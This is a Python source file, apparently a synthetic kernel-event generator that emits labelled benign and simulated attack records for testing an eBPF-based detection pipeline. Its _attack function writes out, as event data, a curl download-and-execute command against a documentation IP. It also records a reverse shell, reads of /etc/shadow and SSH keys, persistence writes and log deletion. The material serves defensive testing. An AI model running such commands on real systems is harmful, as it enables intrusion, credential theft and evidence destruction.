"""Synthetic kernel-event generator (replay source for tests & demos).

Produces raw ROOTLINE records (the same shape the eBPF probe / SentinelCore
adapter emit) for a Linux lab host: benign background workload plus an
optional, fully *simulated* attack chain. Nothing is executed - these are just
event records. All IPs are RFC 5737 documentation addresses.

Attack chain (labelled ``label="attack"``):
  firefox downloads invoice.docm -> soffice opens it -> macro spawns sh ->
  curl fetches /tmp/.x -> /tmp/.x beacons to 203.0.113.66:4444 -> spawns bash ->
  reads /etc/shadow + ~/.ssh/id_rsa -> writes crontab + .bashrc -> deletes
  /var/log/auth.log.
"""
from __future__ import annotations

import json
import random
from dataclasses import dataclass, field
from typing import Any

T0 = 1_700_000_000.0
USER = "alice"
HOME = f"/home/{USER}"
C2_IP = "203.0.113.66"
DELIVERY_IP = "198.51.100.23"
PAYLOAD_SHA = "9f2c0e6b7a1d4c3e8f5a6b7c8d9e0f1a2b3c4d5e6f708192a3b4c5d6e7f80912"
LIBS = ["/usr/lib/x86_64-linux-gnu/libc.so.6", "/etc/ld.so.cache", "/usr/lib/locale/locale-archive",
        "/usr/lib/x86_64-linux-gnu/libpthread.so.0", "/etc/nsswitch.conf", "/proc/self/maps"]


@dataclass
class Sim:
    """A tiny scripted host: tracks processes and emits raw records with a moving clock."""

    host: str = "lab-vm"
    rng: random.Random = field(default_factory=lambda: random.Random(7))
    t: float = T0
    next_pid: int = 1000
    procs: dict[int, dict[str, Any]] = field(default_factory=dict)
    records: list[dict[str, Any]] = field(default_factory=list)
    label: str | None = None

    def tick(self, lo: float = 0.001, hi: float = 0.05) -> float:
        """Advance the clock by a random step and return the new timestamp."""
        self.t += self.rng.uniform(lo, hi)
        return round(self.t, 6)

    def emit(self, kind: str, pid: int, **kw: Any) -> None:
        """Append one raw record for ``pid`` (current comm/exe/uid filled in)."""
        p = self.procs[pid]
        rec = {"ts": self.tick(), "host": self.host, "kind": kind, "pid": pid, "ppid": p["ppid"],
               "uid": p["uid"], "comm": p["comm"], "exe": p["exe"], **kw}
        if self.label:
            rec["label"] = self.label
        self.records.append(rec)

    def spawn_root(self, pid: int, comm: str, exe: str, uid: int = 0, ppid: int = 1) -> int:
        """Register an already-running process (no fork event) and return its pid."""
        self.procs[pid] = {"ppid": ppid, "uid": uid, "comm": comm, "exe": exe}
        return pid

    def fork(self, pid: int) -> int:
        """Fork ``pid`` and return the child's pid."""
        child = self.next_pid
        self.next_pid += 1
        self.emit("fork", pid, child_pid=child)
        self.procs[child] = {**self.procs[pid], "ppid": pid}
        return child

    def exec(self, pid: int, path: str, *argv: str, sha256: str | None = None, libs: bool = True) -> None:
        """Exec ``path`` in ``pid`` (with the usual shared-library opens unless ``libs`` is false)."""
        comm = path.rsplit("/", 1)[-1][:15]
        self.procs[pid].update(comm=comm, exe=path)
        kw: dict[str, Any] = {"path": path, "argv": [comm, *argv]}
        if sha256:
            kw["sha256"] = sha256
        self.emit("exec", pid, **kw)
        if libs:
            for lib in self.rng.sample(LIBS, 3):
                self.emit("open", pid, path=lib, flags="O_RDONLY")

    def spawn(self, parent: int, path: str, *argv: str, **kw: Any) -> int:
        """Fork ``parent`` and exec ``path`` in the child; return the child's pid."""
        c = self.fork(parent)
        self.exec(c, path, *argv, **kw)
        return c

    def read(self, pid: int, path: str) -> None:
        """Open ``path`` read-only."""
        self.emit("open", pid, path=path, flags="O_RDONLY")

    def write(self, pid: int, path: str, sha256: str | None = None) -> None:
        """Open ``path`` for writing (optionally recording the written content's hash)."""
        kw: dict[str, Any] = {"path": path, "flags": "O_WRONLY|O_CREAT"}
        if sha256:
            kw["sha256"] = sha256
        self.emit("open", pid, **kw)

    def connect(self, pid: int, ip: str, port: int) -> None:
        """Outbound connection to ``ip:port``."""
        self.emit("connect", pid, dst_ip=ip, dst_port=port)

    def unlink(self, pid: int, path: str) -> None:
        """Delete ``path``."""
        self.emit("unlink", pid, path=path)

    def exit(self, pid: int) -> None:
        """Process exit."""
        self.emit("exit", pid)


def _benign_session(s: Sim, sess: int, bash: int, firefox: int, i: int) -> None:
    r = s.rng
    choice = r.random()
    if choice < 0.35:
        cmd = r.choice(["/usr/bin/ls", "/usr/bin/cat", "/usr/bin/grep", "/usr/bin/git", "/usr/bin/vim"])
        c = s.spawn(bash, cmd)
        for _ in range(r.randint(1, 4)):
            s.read(c, f"{HOME}/projects/app/src/mod{r.randint(0, 40)}.py")
        if cmd.endswith("vim"):
            s.write(c, f"{HOME}/projects/app/src/mod{r.randint(0, 40)}.py")
        s.exit(c)
    elif choice < 0.55:
        c = s.spawn(bash, "/usr/bin/python3", "train.py")
        f = f"{HOME}/data/batch{r.randint(0, 5)}.csv"
        for _ in range(r.randint(5, 30)):  # repetitive reads -> reduction fodder
            s.read(c, f)
        s.write(c, f"{HOME}/data/out{i % 7}.json")
        s.exit(c)
    elif choice < 0.8:
        s.connect(firefox, f"198.51.100.{r.randint(1, 20)}", 443)
        for _ in range(r.randint(1, 5)):
            s.write(firefox, f"{HOME}/.mozilla/firefox/prof/cache2/entries/{r.randint(0, 999):04x}")
    elif choice < 0.9:
        c = s.spawn(sess, "/usr/lib/libreoffice/program/soffice", f"{HOME}/Documents/report{i % 3}.odt")
        s.read(c, f"{HOME}/Documents/report{i % 3}.odt")
        s.write(c, f"{HOME}/Documents/report{i % 3}.odt")
        s.exit(c)
    else:
        c = s.spawn(1, "/usr/sbin/logrotate", "/etc/logrotate.conf")
        s.read(c, "/etc/logrotate.conf")
        s.unlink(c, f"/var/log/syslog.{r.randint(2, 7)}.gz")
        s.exit(c)


def _attack(s: Sim, sess: int, firefox: int) -> dict[str, Any]:
    doc = f"{HOME}/Downloads/invoice.docm"
    s.connect(firefox, DELIVERY_IP, 443)
    s.write(firefox, doc)
    s.label = "attack"
    office = s.spawn(sess, "/usr/lib/libreoffice/program/soffice", doc)
    s.read(office, doc)
    sh = s.spawn(office, "/bin/sh", "-c", "curl -s http://203.0.113.66/x -o /tmp/.x; chmod +x /tmp/.x; /tmp/.x")
    curl = s.spawn(sh, "/usr/bin/curl", "-s", f"http://{C2_IP}/x", "-o", "/tmp/.x")
    s.connect(curl, C2_IP, 80)
    s.write(curl, "/tmp/.x", sha256=PAYLOAD_SHA)
    s.exit(curl)
    implant = s.spawn(sh, "/tmp/.x", sha256=PAYLOAD_SHA)
    s.connect(implant, C2_IP, 4444)
    rsh = s.spawn(implant, "/bin/bash", "-i")
    s.read(rsh, "/etc/shadow")
    s.read(rsh, f"{HOME}/.ssh/id_rsa")
    s.write(rsh, f"/var/spool/cron/crontabs/{USER}")
    s.write(rsh, f"{HOME}/.bashrc")
    s.write(rsh, "/tmp/.loot.tar")
    s.unlink(rsh, "/var/log/auth.log")
    s.label = None
    return {"root_cause": doc, "c2": [C2_IP], "sha256": PAYLOAD_SHA,
            "touched": ["/etc/shadow", f"{HOME}/.ssh/id_rsa", f"/var/spool/cron/crontabs/{USER}",
                        f"{HOME}/.bashrc", "/tmp/.loot.tar", "/var/log/auth.log", "/tmp/.x"]}


def generate(n_benign: int = 300, attack: bool = True, seed: int = 7, host: str = "lab-vm",
             attack_at: float = 0.6) -> tuple[list[dict[str, Any]], dict[str, Any]]:
    """Return (raw records, ground truth). ``n_benign`` = benign activity bursts."""
    s = Sim(host=host, rng=random.Random(seed))
    s.spawn_root(1, "systemd", "/usr/lib/systemd/systemd")
    s.spawn_root(900, "gnome-session", "/usr/bin/gnome-session", uid=1000)
    # sshd legitimately reads /etc/shadow (allowlisted)
    s.spawn_root(400, "sshd", "/usr/sbin/sshd")
    s.read(400, "/etc/shadow")
    bash = s.spawn(900, "/bin/bash")
    firefox = s.spawn(900, "/usr/lib/firefox/firefox")
    truth: dict[str, Any] = {}
    at = int(n_benign * attack_at)
    for i in range(n_benign):
        if attack and i == at:
            truth = _attack(s, 900, firefox)
        _benign_session(s, 900, bash, firefox, i)
    if attack and not truth:
        truth = _attack(s, 900, firefox)
    return s.records, truth


def write_jsonl(records: list[dict[str, Any]], path: str) -> None:
    """Write raw records as compact JSON lines."""
    with open(path, "w", encoding="utf-8", newline="\n") as fh:
        for r in records:
            fh.write(json.dumps(r, separators=(",", ":")) + "\n")
